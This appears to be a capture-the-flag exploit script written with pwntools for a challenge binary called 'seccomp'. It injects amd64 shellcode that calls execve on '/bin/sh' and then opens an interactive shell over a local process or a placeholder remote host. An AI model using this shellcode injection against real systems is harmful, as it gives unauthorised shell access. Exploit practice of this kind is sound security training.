#!/usr/bin/env python3

from pwn import *

exe = ELF("./seccomp", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("addr", 1337)

input()

shellcode = asm('''
	mov rdi, 29400045130965551
	push rdi

	mov rdi, rsp
	mov rax, 0x3b
	xor rsi, rsi
	xor rdx, rdx
	syscall
    ''', arch='amd64')
p.sendlineafter(b'> ', str(1))
p.sendafter(b'shellcode: ', shellcode)

p.sendlineafter(b'> ', str(2))

p.interactive()